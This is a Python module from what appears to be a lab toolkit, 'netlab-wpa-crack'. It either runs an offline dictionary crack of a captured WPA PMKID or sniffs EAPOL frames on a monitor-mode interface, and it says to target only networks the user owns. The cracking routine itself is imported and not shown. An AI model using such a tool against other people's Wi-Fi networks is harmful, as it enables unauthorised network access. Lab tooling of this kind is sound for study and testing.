# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-wpa-crack: crack a captured PMKID, or capture one. LAB ONLY.

With ``--pmkid`` this runs the offline dictionary crack (no radio needed). Without
it, it sniffs EAPOL / RSN PMKID on a monitor-mode interface to capture one first.
Only ever target a network you own.
"""

from __future__ import annotations

import argparse
from pathlib import Path

from netlab_core import verdict
from netlab_core.sniffing import load_scapy

from netlab_wpa_crack.crack import crack_pmkid


def run(args: argparse.Namespace) -> int:
    if args.pmkid:
        words = Path(args.wordlist).read_text().split() if args.wordlist else ["password1", "admin"]
        found = crack_pmkid(bytes.fromhex(args.pmkid), args.ssid, args.ap_mac, args.sta_mac, words)
        verdict("ALERT" if found else "INFO", f"crack result: {found!r}")
        return 0
    s = load_scapy()
    print(f"[*] capturing EAPOL/PMKID on {args.iface} (monitor mode). Ctrl-C to stop.")
    s.sniff(
        iface=args.iface,
        prn=lambda p: verdict("INFO", "EAPOL frame") if p.haslayer(s.EAPOL) else None,
        store=0,
    )
    return 0
